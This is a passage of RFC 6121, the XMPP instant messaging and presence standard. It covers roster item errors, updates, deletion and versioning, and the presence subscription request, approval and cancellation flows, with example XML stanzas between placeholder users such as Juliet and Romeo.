   Error: Roster set contains more than one item

   C: <iq from='juliet@example.com/balcony'
          id='nw83vcj4'
          type='set'>
        <query xmlns='jabber:iq:roster'>
          <item jid='nurse@example.com'
                name='Nurse'>
            <group>Servants</group>
          </item>
          <item jid='mother@example.com'
                name='Mom'>
            <group>Family</group>
          </item>
        </query>
      </iq>

   S: <iq id='nw83vcj4'
          to='juliet@example.com/balcony'
          type='error'>
       <error type='modify'>
         <bad-request xmlns='urn:ietf:params:xml:ns:xmpp-stanzas'/>
       </error>
     </iq>

   Error: Roster set contains item with oversized handle

   C: <iq from='juliet@example.com/balcony'
          id='yl491b3d'
          type='set'>
        <query xmlns='jabber:iq:roster'>
          <item jid='nurse@example.com'
                name='[ ... some-very-long-handle ... ]'>
            <group>Servants</group>
          </item>
        </query>
      </iq>

   S: <iq id='yl491b3d'
          to='juliet@example.com/balcony'
          type='error'>
        <error type='modify'>
          <not-acceptable xmlns='urn:ietf:params:xml:ns:xmpp-stanzas'/>
        </error>
      </iq>

   Error: Roster set contains duplicate groups

Saint-Andre                  Standards Track                   [Page 20]
```

---

```

[RFC 6121](/doc/html/rfc6121)                         XMPP IM                      March 2011

   C: <iq from='juliet@example.com/balcony'
          id='tk3va749'
          type='set'>
        <query xmlns='jabber:iq:roster'>
          <item jid='nurse@example.com'
                name='Nurse'>
            <group>Servants</group>
            <group>Servants</group>
          </item>
        </query>
      </iq>

   S: <iq id='tk3va749'
          to='juliet@example.com/balcony'
          type='error'>
        <error type='modify'>
          <bad-request xmlns='urn:ietf:params:xml:ns:xmpp-stanzas'/>
        </error>
      </iq>

   Error: Roster set contains empty group

   C: <iq from='juliet@example.com/balcony'
          id='fl3b486u'
          type='set'>
        <query xmlns='jabber:iq:roster'>
          <item jid='nurse@example.com'
                name='Nurse'>
            <group></group>
          </item>
        </query>
      </iq>

   S: <iq id='fl3b486u'
          to='juliet@example.com/balcony'
          type='error'>
        <error type='modify'>
          <not-acceptable xmlns='urn:ietf:params:xml:ns:xmpp-stanzas'/>
        </error>
      </iq>

   Error: Roster set contains oversized group name

Saint-Andre                  Standards Track                   [Page 21]
```

---

```

[RFC 6121](/doc/html/rfc6121)                         XMPP IM                      March 2011

   C: <iq from='juliet@example.com/balcony'
          id='qh3b4v19'
          type='set'>
        <query xmlns='jabber:iq:roster'>
          <item jid='nurse@example.com'
                name='Nurse'>
            <group>[ ... some-very-long-group-name ... ]</group>
          </item>
        </query>
      </iq>

   S: <iq id='qh3b4v19'
          to='juliet@example.com/balcony'
          type='error'>
        <error type='modify'>
          <not-acceptable xmlns='urn:ietf:params:xml:ns:xmpp-stanzas'/>
        </error>
      </iq>

      Interoperability Note: Some servers return a <not-allowed/> stanza
      error to the client if the value of the <item/> element's 'jid'
      attribute matches the bare JID <localpart@domainpart> of the
      user's account.

[2.4](#section-2.4).  Updating a Roster Item

[2.4.1](#section-2.4.1).  Request

   Updating an existing roster item is done in the same way as adding a
   new roster item, i.e., by sending a roster set to the server.
   Because a roster item is atomic, the item MUST be updated exactly as
   provided in the roster set.

   There are several reasons why a client might update a roster item:

   1.  Adding a group

   2.  Deleting a group

   3.  Changing the handle

   4.  Deleting the handle

Saint-Andre                  Standards Track                   [Page 22]
```

---

```

[RFC 6121](/doc/html/rfc6121)                         XMPP IM                      March 2011

   Consider a roster item that is defined as follows:

       <item jid='romeo@example.net'
             name='Romeo'>
         <group>Friends</group>
       </item>

   The user who has this item in her roster might want to add the item
   to another group.

   C: <iq from='juliet@example.com/balcony'
          id='di43b2x9'
          type='set'>
        <query xmlns='jabber:iq:roster'>
          <item jid='romeo@example.net'
                name='Romeo'>
            <group>Friends</group>
            <group>Lovers</group>
          </item>
        </query>
      </iq>

   Sometime later, the user might want to remove the item from the
   original group.

   C: <iq from='juliet@example.com/balcony'
          id='lf72v157'
          type='set'>
        <query xmlns='jabber:iq:roster'>
          <item jid='romeo@example.net'
                name='Romeo'>
            <group>Lovers</group>
          </item>
        </query>
      </iq>

   The user might want to remove the item from all groups.

   C: <iq from='juliet@example.com/balcony'
          id='ju4b62a5'
          type='set'>
        <query xmlns='jabber:iq:roster'>
          <item jid='romeo@example.net'/>
        </query>
      </iq>

   The user might also want to change the handle for the item.

Saint-Andre                  Standards Track                   [Page 23]
```

---

```

[RFC 6121](/doc/html/rfc6121)                         XMPP IM                      March 2011

   C: <iq from='juliet@example.com/balcony'
          id='gb3sv487'
          type='set'>
        <query xmlns='jabber:iq:roster'>
          <item jid='romeo@example.net'
                name='MyRomeo'/>
        </query>
      </iq>

   The user might then want to remove the handle altogether.

   C: <iq from='juliet@example.com/balcony'
          id='o3bx66s5'
          type='set'>
        <query xmlns='jabber:iq:roster'>
          <item jid='romeo@example.net'
                name=''/>
        </query>
      </iq>

      Implementation Note: Including an empty 'name' attribute is
      equivalent to including no 'name' attribute; both actions set the
      name to the empty string.

[2.4.2](#section-2.4.2).  Success Case

   As with adding a roster item, if the roster item can be successfully
   processed then the server MUST update the item in the user's roster,
   send a roster push to all of the user's interested resources, and
   send an IQ result to the initiating resource; details are provided
   under [Section 2.3](#section-2.3).

[2.4.3](#section-2.4.3).  Error Cases

   The error cases described under [Section 2.3.3](#section-2.3.3) also apply to updating
   a roster item.

[2.5](#section-2.5).  Deleting a Roster Item

[2.5.1](#section-2.5.1).  Request

   At any time, a client can delete an item from his or her roster by
   sending a roster set and specifying a value of "remove" for the
   'subscription' attribute.

Saint-Andre                  Standards Track                   [Page 24]
```

---

```

[RFC 6121](/doc/html/rfc6121)                         XMPP IM                      March 2011

   C: <iq from='juliet@example.com/balcony'
          id='hm4hs97y'
          type='set'>
        <query xmlns='jabber:iq:roster'>
          <item jid='nurse@example.com'
                subscription='remove'/>
        </query>
      </iq>

[2.5.2](#section-2.5.2).  Success Case

   As with adding a roster item, if the server can successfully process
   the roster set then it MUST update the item in the user's roster,
   send a roster push to all of the user's interested resources (with
   the 'subscription' attribute set to a value of "remove"), and send an
   IQ result to the initiating resource; details are provided under
   [Section 2.3](#section-2.3).

   In addition, the user's server might need to generate one or more
   subscription-related presence stanzas, as follows:

   1.  If the user has a presence subscription to the contact, then the
       user's server MUST send a presence stanza of type "unsubscribe"
       to the contact (in order to unsubscribe from the contact's
       presence).

   2.  If the contact has a presence subscription to the user, then the
       user's server MUST send a presence stanza of type "unsubscribed"
       to the contact (in order to cancel the contact's subscription to
       the user).

   3.  If the presence subscription is mutual, then the user's server
       MUST send both a presence stanza of type "unsubscribe" and a
       presence stanza of type "unsubscribed" to the contact.

   S: <presence from='juliet@example.com'
                id='lm3ba81g'
                to='nurse@example.com'
                type='unsubscribe'/>

   S: <presence from='juliet@example.com'
                id='xb2c1v4k'
                to='nurse@example.com'
                type='unsubscribed'/>

Saint-Andre                  Standards Track                   [Page 25]
```

---

```

[RFC 6121](/doc/html/rfc6121)                         XMPP IM                      March 2011

[2.5.3](#section-2.5.3).  Error Cases

   If the value of the 'jid' attribute specifies an item that is not in
   the roster, then the server MUST return an <item-not-found/> stanza
   error.

   Error: Roster item not found

   C: <iq from='juliet@example.com/balcony'
          id='uj4b1ca8'
          type='set'>
        <query xmlns='jabber:iq:roster'>
          <item jid='[ ... non-existent-jid ... ]'
                subscription='remove'/>
        </query>
      </iq>

   S: <iq id='uj4b1ca8'
          to='juliet@example.com/balcony'
          type='error'>
        <error type='modify'>
          <item-not-found
              xmlns='urn:ietf:params:xml:ns:xmpp-stanzas'/>
        </error>
      </iq>

[2.6](#section-2.6).  Roster Versioning

[2.6.1](#section-2.6.1).  Stream Feature

   If a server supports roster versioning, then it MUST advertise the
   following stream feature during stream negotiation.

   <ver xmlns='urn:xmpp:features:rosterver'/>

   The roster versioning stream feature is merely informative and
   therefore is never mandatory-to-negotiate.

[2.6.2](#section-2.6.2).  Request

   If a client supports roster versioning and the server to which it has
   connected advertises support for roster versioning as described in
   the foregoing section, then the client SHOULD include the 'ver'
   element in its request for the roster.  If the server does not
   advertise support for roster versioning, the client MUST NOT include
   the 'ver' attribute.  If the client includes the 'ver' attribute in
   its roster get, it sets the attribute's value to the version ID
   associated with its last cache of the roster.

Saint-Andre                  Standards Track                   [Page 26]
```

---

```

[RFC 6121](/doc/html/rfc6121)                         XMPP IM                      March 2011

   C: <iq from='romeo@example.net/home'
          id='r1h3vzp7'
          to='romeo@example.net'
          type='get'>
        <query xmlns='jabber:iq:roster' ver='ver14'/>
      </iq>

   If the client has not yet cached the roster or the cache is lost or
   corrupted, but the client wishes to bootstrap the use of roster
   versioning, it MUST set the 'ver' attribute to the empty string
   (i.e., ver="").

   Naturally, if the client does not support roster versioning or does
   not wish to bootstrap the use of roster versioning, it will not
   include the 'ver' attribute.

[2.6.3](#section-2.6.3).  Success Case

   Whether or not the roster has been modified since the version ID
   enumerated by the client, the server MUST either return the complete
   roster as described under [Section 2.1.4](#section-2.1.4) (including a 'ver' attribute
   that signals the latest version) or return an empty IQ-result (thus
   indicating that any roster modifications will be sent via roster
   pushes, as described below).  In general, unless returning the
   complete roster would (1) use less bandwidth than sending individual
   roster pushes to the client (e.g., if the roster contains only a few
   items) or (2) the server cannot associate the version ID with any
   previous version it has on file, the server SHOULD send an empty IQ-
   result and then send the modifications (if any) via roster pushes.

   S: <iq from='romeo@example.net'
          id='r1h3vzp7'
          to='romeo@example.net/home'
          type='result'/>

      Implementation Note: This empty IQ-result is different from an
      empty <query/> element, thus disambiguating this usage from an
      empty roster.

   If roster versioning is enabled and the roster has not been modified
   since the version ID enumerated by the client, the server will simply
   not send any roster pushes to the client (until and unless some
   relevant event triggers a roster push during the lifetime of the
   client's session).

Saint-Andre                  Standards Track                   [Page 27]
```

---

```

[RFC 6121](/doc/html/rfc6121)                         XMPP IM                      March 2011

   If the roster has been modified since the version ID enumerated by
   the client, the server MUST then send one roster push to the client
   for each roster item that has been modified since the version ID
   enumerated by the client.  (We call a roster push that is sent for
   purposes of roster version synchronization an "interim roster push".)

      Definition: A "roster modification" is any change to the roster
      data that would result in a roster push to a connected client.
      Therefore, internal states related to roster processing within the
      server that would not result in a roster push to a connected
      client do not necessitate a change to the version.

   S: <iq from='romeo@example.net'
          id='ah382g67'
          to='romeo@example.net/home'
          type='set'>
        <query xmlns='jabber:iq:roster' ver='ver34'>
          <item jid='tybalt@example.org' subscription='remove'/>
        </query>
      </iq>

   S: <iq from='romeo@example.net'
          id='b2gs90j5'
          to='romeo@example.net/home'
          type='set'>
        <query xmlns='jabber:iq:roster' ver='ver42'>
          <item jid='bill@example.org' subscription='both'/>
        </query>
      </iq>

   S: <iq from='romeo@example.net'
          id='c73gs419'
          to='romeo@example.net/home'
          type='set'>
        <query xmlns='jabber:iq:roster' ver='ver72'>
          <item jid='nurse@example.org'
                name='Nurse'
                subscription='to'>
            <group>Servants</group>
          </item>
        </query>
      </iq>

Saint-Andre                  Standards Track                   [Page 28]
```

---

```

[RFC 6121](/doc/html/rfc6121)                         XMPP IM                      March 2011

   S: <iq from='romeo@example.net'
          id='dh361f35'
          to='romeo@example.net/home'
          type='set'>
        <query xmlns='jabber:iq:roster' ver='ver96'>
          <item jid='juliet@example.org'
                name='Juliet'
                subscription='both'>
            <group>VIPs</group>
          </item>
        </query>
      </iq>

   These "interim roster pushes" can be understood as follows:

   1.  Imagine that the client had an active presence session for the
       entire time between its cached roster version (say, "ver14") and
       the new roster version (say, "ver96").

   2.  During that time, the client might have received roster pushes
       related to various roster versions (which might have been, say,
       "ver51" and "ver79").  However, some of those roster pushes might
       have contained intermediate updates to the same roster item
       (e.g., modifications to the subscription state for
       bill@example.org from "none" to "to" and from "to" to "both").

   3.  The interim roster pushes would not include all of the
       intermediate steps, only the final result of all modifications
       applied to each item while the client was in fact offline (which
       might have been, say, "ver34", "ver42", "ver72", and "ver96").

   The client MUST handle an "interim roster push" in the same way it
   handles any roster push (indeed, from the client's perspective it
   cannot tell the difference between an "interim" roster push and a
   "live" roster push and therefore it has no way of knowing when it has
   received all of the interim roster pushes).  When requesting the
   roster after reconnection, the client SHOULD request the version
   associated with the last roster push it received during its previous
   session, not the version associated with the roster result it
   received at the start of its previous session.

   When roster versioning is enabled, the server MUST include the
   updated roster version with each roster push.  Roster pushes MUST
   occur in order of modification and the version contained in a roster
   push MUST be unique.  Even if the client has not included the 'ver'
   attribute in its roster gets or sets, the server SHOULD include the
   'ver' attribute on all roster pushes and results that it sends to the
   client.

Saint-Andre                  Standards Track                   [Page 29]
```

---

```

[RFC 6121](/doc/html/rfc6121)                         XMPP IM                      March 2011

      Implementation Note: Guidelines and more detailed examples for
      roster versioning are provided in [[XEP-0237](#ref-XEP-0237)].

[3](#section-3).  Managing Presence Subscriptions

   In order to protect the privacy of XMPP users, presence information
   is disclosed only to other entities that a user has approved.  When a
   user has agreed that another entity is allowed to view its presence,
   the entity is said to have a "subscription" to the user's presence.
   An entity that has a subscription to a user's presence or to which a
   user has a presence subscription is called a "contact" (in this
   document the term "contact" is also used in a less strict sense to
   refer to a potential contact or any item in a user's roster).

   In XMPP, a subscription lasts across presence sessions; indeed, it
   lasts until the contact unsubscribes or the user cancels the
   previously granted subscription.  (This model is different from that
   used for presence subscriptions in the Session Initiation Protocol
   (SIP), as defined in [[SIP-PRES](#ref-SIP-PRES)].)

   Subscriptions are managed within XMPP by sending presence stanzas
   containing specially defined attributes ("subscribe", "unsubscribe",
   "subscribed", and "unsubscribed").

      Implementation Note: When a server processes or generates an
      outbound presence stanza of type "subscribe", "subscribed",
      "unsubscribe", or "unsubscribed", the server MUST stamp the
      outgoing presence stanza with the bare JID <localpart@domainpart>
      of the sending entity, not the full JID
      <localpart@domainpart/resourcepart>.  Enforcement of this rule
      simplifies the presence subscription model and helps to prevent
      presence leaks; for information about presence leaks, refer to the
      security considerations of [[XMPP-CORE](#ref-XMPP-CORE)].

   Subscription states are reflected in the rosters of both the user and
   the contact.  This section does not cover every possible case related
   to presence subscriptions, and mainly narrates the protocol flows for
   bootstrapping a mutual subscription between a user and a contact.
   Complete details regarding subscription states can be found under
   [Appendix A](#appendix-A).

[3.1](#section-3.1).  Requesting a Subscription

   A "subscription request" is a request from a user for authorization
   to permanently subscribe to a contact's presence information;
   syntactically it is a presence stanza whose 'type' attribute has a
   value of "subscribe".  A subscription request is generated by a

Saint-Andre                  Standards Track                   [Page 30]
```

---

```

[RFC 6121](/doc/html/rfc6121)                         XMPP IM                      March 2011

   user's client, processed by the (potential) contact's server, and
   acted on by the contact via the contact's client.  The workflow is
   described in the following sections.

      Implementation Note: Presence subscription requests are sent to
      available resources, whereas the roster pushes associated with
      subscription state changes are sent to interested resources.
      Therefore, if a resource wishes to receive both subscription
      requests and roster pushes, it MUST both send initial presence and
      request the roster.

[3.1.1](#section-3.1.1).  Client Generation of Outbound Subscription Request

   A user's client generates a subscription request by sending a
   presence stanza of type "subscribe" and specifying a 'to' address of
   the potential contact's bare JID <contact@domainpart>.

   UC: <presence id='xk3h1v69'
                 to='juliet@example.com'
                 type='subscribe'/>

   When a user sends a presence subscription request to a potential
   instant messaging and presence contact, the value of the 'to'
   attribute MUST be a bare JID <contact@domainpart> rather than a full
   JID <contact@domainpart/resourcepart>, since the desired result is
   for the user to receive presence from all of the contact's resources,
   not merely the particular resource specified in the 'to' attribute.
   Use of bare JIDs also simplifies subscription processing, presence
   probes, and presence notifications by the user's server and the
   contact's server.

   For tracking purposes, a client SHOULD include an 'id' attribute in a
   presence subscription request.

      Implementation Note: Many XMPP clients prompt the user for
      information about the potential contact (e.g., "handle" and
      desired roster group) when generating an outbound presence
      subscription request and therefore send a roster set before
      sending the outbound presence subscription request.  This behavior
      is OPTIONAL, because a client MAY instead wait until receiving the
      initial roster push from the server before uploading user-provided
      information about the contact.  A server MUST process a roster set
      and outbound presence subscription request in either order (i.e.,
      in whatever order generated by the client).

Saint-Andre                  Standards Track                   [Page 31]
```

---

```

[RFC 6121](/doc/html/rfc6121)                         XMPP IM                      March 2011

[3.1.2](#section-3.1.2).  Server Processing of Outbound Subscription Request

   Upon receiving the outbound presence subscription request, the user's
   server MUST proceed as follows.

   1.  Before processing the request, the user's server MUST check the
       syntax of the JID contained in the 'to' attribute (however, it is
       known that some existing implementations do not perform this
       check).  If the JID is of the form
       <contact@domainpart/resourcepart> instead of
       <contact@domainpart>, the user's server SHOULD treat it as if the
       request had been directed to the contact's bare JID and modify
       the 'to' address accordingly.  The server MAY also verify that
       the JID adheres to the format defined in [[XMPP-ADDR](#ref-XMPP-ADDR)] and possibly
       return a <jid-malformed/> stanza error.

   2.  If the potential contact is hosted on the same server as the
       user, then the server MUST adhere to the rules specified under
       [Section 3.1.3](#section-3.1.3) when processing the subscription request and
       delivering it to the (local) contact.

   3.  If the potential contact is hosted on a remote server, subject to
       local service policies the user's server MUST then route the
       stanza to that remote domain in accordance with core XMPP stanza
       processing rules.  (This can result in returning an appropriate
       stanza error to the user, such as <remote-server-timeout/>.)

   As mentioned, before locally delivering or remotely routing the
   presence subscription request, the user's server MUST stamp the
   outbound subscription request with the bare JID <user@domainpart> of
   the user.

   US: <presence from='romeo@example.net'
                 id='xk3h1v69'
                 to='juliet@example.com'
                 type='subscribe'/>

   If the presence subscription request cannot be locally delivered or
   remotely routed (e.g., because the request is malformed, the local
   contact does not exist, the remote server does not exist, an attempt
   to contact the remote server times out, or any other error is
   determined or experienced by the user's server), then the user's
   server MUST return an appropriate error stanza to the user.  An
   example follows.

Saint-Andre                  Standards Track                   [Page 32]
```

---

```

[RFC 6121](/doc/html/rfc6121)                         XMPP IM                      March 2011

   US: <presence from='juliet@example.com'
                 id='xk3h1v69'
                 to='romeo@example.net'
                 type='error'>
         <error type='modify'>
           <remote-server-not-found
               xmlns='urn:ietf:params:xml:ns:xmpp-stanzas'/>
         </error>
       </presence>

   After locally delivering or remotely routing the presence
   subscription request, the user's server MUST then send a roster push
   to all of the user's interested resources, containing the potential
   contact with a subscription state of "none" and with notation that
   the subscription is pending (via an 'ask' attribute whose value is
   "subscribe").

   US: <iq id='b89c5r7ib574'
           to='romeo@example.net/foo'
           type='set'>
         <query xmlns='jabber:iq:roster'>
           <item ask='subscribe'
                 jid='juliet@example.com'
                 subscription='none'/>
         </query>
       </iq>

   US: <iq id='b89c5r7ib575'
           to='romeo@example.net/bar'
           type='set'>
         <query xmlns='jabber:iq:roster'>
           <item ask='subscribe'
                 jid='juliet@example.com'
                 subscription='none'/>
         </query>
       </iq>

   If a remote contact does not approve or deny the subscription request
   within some configurable amount of time, the user's server SHOULD
   resend the subscription request to the contact based on an
   implementation-specific algorithm (e.g., whenever a new resource
   becomes available for the user, or after a certain amount of time has
   elapsed); this helps to recover from transient, silent errors that
   might have occurred when the original subscription request was routed
   to the remote domain.  When doing so, it is RECOMMENDED for the
   server to include an 'id' attribute so that it can track responses to
   the resent subscription request.

Saint-Andre                  Standards Track                   [Page 33]
```

---

```

[RFC 6121](/doc/html/rfc6121)                         XMPP IM                      March 2011

[3.1.3](#section-3.1.3).  Server Processing of Inbound Subscription Request

   Before processing the inbound presence subscription request, the
   contact's server SHOULD check the syntax of the JID contained in the
   'to' attribute.  If the JID is of the form
   <contact@domainpart/resourcepart> instead of <contact@domainpart>,
   the contact's server SHOULD treat it as if the request had been
   directed to the contact's bare JID and modify the 'to' address
   accordingly.  The server MAY also verify that the JID adheres to the
   format defined in [[XMPP-ADDR](#ref-XMPP-ADDR)] and possibly return a <jid-malformed/>
   stanza error.

   When processing the inbound presence subscription request, the
   contact's server MUST adhere to the following rules:

   1.  Above all, the contact's server MUST NOT automatically approve
       subscription requests on the contact's behalf -- unless the
       contact has (a) pre-approved subscription requests from the user
       as described under [Section 3.4](#section-3.4), (b) configured its account to
       automatically approve subscription requests, or (c) accepted an
       agreement with its service provider that allows automatic
       approval (for instance, via an employment agreement within an
       enterprise deployment).  Instead, if a subscription request
       requires approval then the contact's server MUST deliver that
       request to the contact's available resource(s) for approval or
       denial by the contact.

   2.  If the contact exists and the user already has a subscription to
       the contact's presence, then the contact's server MUST auto-reply
       on behalf of the contact by sending a presence stanza of type
       "subscribed" from the contact's bare JID to the user's bare JID.
       Likewise, if the contact previously sent a presence stanza of
       type "subscribed" and the contact's server treated that as
       indicating "pre-approval" for the user's presence subscription
       (see [Section 3.4](#section-3.4)), then the contact's server SHOULD also auto-
       reply on behalf of the contact.

   CS: <presence from='juliet@example.com'
                 id='xk3h1v69'
                 to='romeo@example.net'
                 type='subscribed'/>

   3.  Otherwise, if there is at least one available resource associated
       with the contact when the subscription request is received by the
       contact's server, then the contact's server MUST send that
       subscription request to all available resources in accordance
       with [Section 8](#section-8).  As a way of acknowledging receipt of the
       presence subscription request, the contact's server MAY send a

Saint-Andre                  Standards Track                   [Page 34]
```

---

```

[RFC 6121](/doc/html/rfc6121)                         XMPP IM                      March 2011

       presence stanza of type "unavailable" from the bare JID of the
       contact to the bare JID of the user (the user's client MUST NOT
       assume that this acknowledgement provides presence information
       about the contact, since it comes from the contact's bare JID and
       is received before the subscription request has been approved).

   4.  Otherwise, if the contact has no available resources when the
       subscription request is received by the contact's server, then
       the contact's server MUST keep a record of the complete presence
       stanza comprising the subscription request, including any
       extended content contained therein (see Section 8.4 of
       [[XMPP-CORE](#ref-XMPP-CORE)]), and then deliver the request when the contact next
       has an available resource.  The contact's server MUST continue to
       deliver the subscription request whenever the contact creates an
       available resource, until the contact either approves or denies
       the request.  (The contact's server MUST NOT deliver more than
       one subscription request from any given user when the contact
       next has an available resource; e.g., if the user sends multiple
       subscription requests to the contact while the contact is
       offline, the contact's server SHOULD store only one of those
       requests, such as the first request or last request, and MUST
       deliver only one of the requests when the contact next has an
       available resource; this helps to prevent "subscription request
       spam".)

      Security Warning: Until and unless the contact approves the
      subscription request as described under [Section 3.1.4](#section-3.1.4), the
      contact's server MUST NOT add an item for the user to the
      contact's roster.

      Security Warning: The mandate for the contact's server to store
      the complete stanza of the presence subscription request
      introduces the possibility of an application resource exhaustion
      attack (see Section 2.1.2 of [[DOS](#ref-DOS "\"Internet Denial-of- Service Considerations\"")]), for example, by a rogue
      server or a coordinated group of users (e.g., a botnet) against
      the contact's server or particular contact.  Server implementers
      are advised to consider the possibility of such attacks and
      provide tools for counteracting it, such as enabling service
      administrators to set limits on the number or size of inbound
      presence subscription requests that the server will store in
      aggregate or for any given contact.

[3.1.4](#section-3.1.4).  Client Processing of Inbound Subscription Request

   When an interactive client receives a subscription request, it MUST
   present the request to the natural person controlling the client
   (i.e., the "contact") for approval, unless the contact has explicitly
   configured the client to automatically approve or deny some or all

Saint-Andre                  Standards Track                   [Page 35]
```

---

```

[RFC 6121](/doc/html/rfc6121)                         XMPP IM                      March 2011

   subscription requests as described above.  An automated client that
   is not controlled by a natural person will have its own application-
   specific rules for approving or denying subscription requests.

   A client approves a subscription request by sending a presence stanza
   of type "subscribed", which is processed as described under
   [Section 3.1.5](#section-3.1.5) for the contact's server and [Section 3.1.6](#section-3.1.6) for the
   user's server.

   CC: <presence id='h4v1c4kj'
                 to='romeo@example.net'
                 type='subscribed'/>

   A client denies a subscription request by sending a presence stanza
   of type "unsubscribed", which is processed as described under
   [Section 3.2](#section-3.2) for both the contact's server and the user's server.

   CC: <presence id='tb2m1b59'
                 to='romeo@example.net'
                 type='unsubscribed'/>

   For tracking purposes, a client SHOULD include an 'id' attribute in a
   subscription approval or subscription denial; this 'id' attribute
   MUST NOT mirror the 'id' attribute of the subscription request.

[3.1.5](#section-3.1.5).  Server Processing of Outbound Subscription Approval

   When the contact's client sends the subscription approval, the
   contact's server MUST stamp the outbound stanza with the bare JID
   <contact@domainpart> of the contact and locally deliver or remotely
   route the stanza to the user.

   CS: <presence from='juliet@example.com'
                 id='h4v1c4kj'
                 to='romeo@example.net'
                 type='subscribed'/>

   The contact's server then MUST send an updated roster push to all of
   the contact's interested resources, with the 'subscription' attribute
   set to a value of "from".  (Here we assume that the contact does not
   already have a subscription to the user; if that were the case, the
   'subscription' attribute would be set to a value of "both", as
   explained under [Appendix A](#appendix-A).)

Saint-Andre                  Standards Track                   [Page 36]
```

---

```

[RFC 6121](/doc/html/rfc6121)                         XMPP IM                      March 2011

   CS: <iq id='a78b4q6ha463'
           to='juliet@example.com/balcony'
           type='set'>
         <query xmlns='jabber:iq:roster'>
           <item jid='romeo@example.net'
                 subscription='from'/>
         </query>
       </iq>

   CS: <iq id='x81g3bdy4n19'
           to='juliet@example.com/chamber'
           type='set'>
         <query xmlns='jabber:iq:roster'>
           <item jid='romeo@example.net'
                 subscription='from'/>
         </query>
       </iq>

   From the perspective of the contact, there now exists a subscription
   from the user, which is why the 'subscription' attribute is set to a
   value of "from".  (Here we assume that the contact does not already
   have a subscription to the user; if that were the case, the
   'subscription' attribute would be set to a value of "both", as
   explained under [Appendix A](#appendix-A).)

   The contact's server MUST then also send current presence to the user
   from each of the contact's available resources.

   CS: <presence from='juliet@example.com/balcony'
                 id='pw72bc5j'
                 to='romeo@example.net'/>

   CS: <presence from='juliet@example.com/chamber'
                 id='ux31da4q'
                 to='romeo@example.net'/>

   In order to subscribe to the user's presence, the contact would then
   need to send a subscription request to the user.  (XMPP clients will
   often automatically send the subscription request instead of
   requiring the contact to initiate the subscription request, since it
   is assumed that the desired end state is a mutual subscription.)
   Naturally, when the contact sends a subscription request to the user,
   the subscription states will be different from those shown in the
   foregoing examples (see [Appendix A](#appendix-A)) and the roles will be reversed.

Saint-Andre                  Standards Track                   [Page 37]
```

---

```

[RFC 6121](/doc/html/rfc6121)                         XMPP IM                      March 2011

[3.1.6](#section-3.1.6).  Server Processing of Inbound Subscription Approval

   When the user's server receives a subscription approval, it MUST
   first check if the contact is in the user's roster with
   subscription='none' or subscription='from' and the 'ask' flag set to
   "subscribe" (i.e., a subscription state of "None + Pending Out",
   "None + Pending Out+In", or "From + Pending Out"; see [Appendix A](#appendix-A)).
   If this check is successful, then the user's server MUST:

   1.  Deliver the inbound subscription approval to all of the user's
       interested resources (this helps to give the user's client(s)
       proper context regarding the subscription approval so that they
       can differentiate between a roster push originated by another of
       the user's resources and a subscription approval received from
       the contact).  This MUST occur before sending the roster push
       described in the next step.

   US: <presence from='juliet@example.com'
                 id='h4v1c4kj'
                 to='romeo@example.net'
                 type='subscribed'/>

   2.  Initiate a roster push to all of the user's interested resources,
       containing an updated roster item for the contact with the
       'subscription' attribute set to a value of "to" (if the
       subscription state was "None + Pending Out" or "None + Pending
       Out+In") or "both" (if the subscription state was "From + Pending
       Out").

   US: <iq id='b89c5r7ib576'
           to='romeo@example.net/foo'
           type='set'>
         <query xmlns='jabber:iq:roster'>
           <item jid='juliet@example.com'
                 subscription='to'/>
         </query>
       </iq>

   US: <iq id='b89c5r7ib577'
           to='romeo@example.net/bar'
           type='set'>
         <query xmlns='jabber:iq:roster'>
           <item jid='juliet@example.com'
                 subscription='to'/>
         </query>
       </iq>

Saint-Andre                  Standards Track                   [Page 38]
```

---

```

[RFC 6121](/doc/html/rfc6121)                         XMPP IM                      March 2011

   3.  The user's server MUST also deliver the available presence stanza
       received from each of the contact's available resources to each
       of the user's available resources.

   [ ... to resource1 ... ]

   US: <presence from='juliet@example.com/balcony'
                 id='pw72bc5j'
                 to='romeo@example.net'/>

   [ ... to resource2 ... ]

   US: <presence from='juliet@example.com/balcony'
                 id='pw72bc5j'
                 to='romeo@example.net'/>

   [ ... to resource1 ... ]

   US: <presence from='juliet@example.com/chamber'
                 id='ux31da4q'
                 to='romeo@example.net'/>

   [ ... to resource2 ... ]

   US: <presence from='juliet@example.com/chamber'
                 id='ux31da4q'
                 to='romeo@example.net'/>

      Implementation Note: If the user's account has no available
      resources when the inbound subscription approval notification is
      received, the user's server MAY keep a record of the notification
      (ideally the complete presence stanza) and then deliver the
      notification when the account next has an available resource.
      This behavior provides more complete signaling to the user
      regarding the reasons for the roster change that occurred while
      the user was offline.

   Otherwise -- that is, if the user does not exist, if the contact is
   not in the user's roster, or if the contact is in the user's roster
   with a subscription state other than those described in the foregoing
   check -- then the user's server MUST silently ignore the subscription
   approval notification by not delivering it to the user, not modifying
   the user's roster, and not generating a roster push to the user's
   interested resources.

   From the perspective of the user, there now exists a subscription to
   the contact's presence (which is why the 'subscription' attribute is
   set to a value of "to").

Saint-Andre                  Standards Track                   [Page 39]
```

---

```

[RFC 6121](/doc/html/rfc6121)                         XMPP IM                      March 2011

[3.2](#section-3.2).  Canceling a Subscription

[3.2.1](#section-3.2.1).  Client Generation of Subscription Cancellation

   If a contact would like to cancel a subscription that it has
   previously granted to a user, to cancel a subscription pre-approval
   ([Section 3.4](#section-3.4)), or to deny a subscription request, it sends a presence
   stanza of type "unsubscribed".

   CC: <presence id='ij5b1v7g'
                 to='romeo@example.net'
                 type='unsubscribed'/>

[3.2.2](#section-3.2.2).  Server Processing of Outbound Subscription Cancellation

   Upon receiving the outbound subscription cancellation, the contact's
   server MUST proceed as follows.

   1.  If the user's bare JID is not yet in the contact's roster or is
       in the contact's roster with a state of "None", "None + Pending
       Out", or "To", the contact's server SHOULD NOT route or deliver
       the presence stanza of type "unsubscribed" to the user and MUST
       NOT send presence notifications of type "unavailable" to the user
       as described below.

   2.  If the user's bare JID is in the contact's roster with a state of
       "None", "None + Pending Out", or "To" and the 'approved' flag is
       set to "true" (thus signaling a subscription pre-approval as
       described under [Section 3.4](#section-3.4)), the contact's server MUST remove
       the pre-approval and MUST NOT route or deliver the presence
       stanza of type "unsubscribed" to the user.

   3.  Otherwise, as shown in the following examples, the contact's
       server MUST route or deliver both presence notifications of type
       "unavailable" and presence stanzas of type "unsubscribed" to the
       user and MUST send a roster push to the contact.

   While the user is still subscribed to the contact's presence (i.e.,
   before the contact's server routes or delivers the presence stanza of
   type "unsubscribed" to the user), the contact's server MUST send a
   presence stanza of type "unavailable" from all of the contact's
   online resources to the user.

Saint-Andre                  Standards Track                   [Page 40]
```

---

```

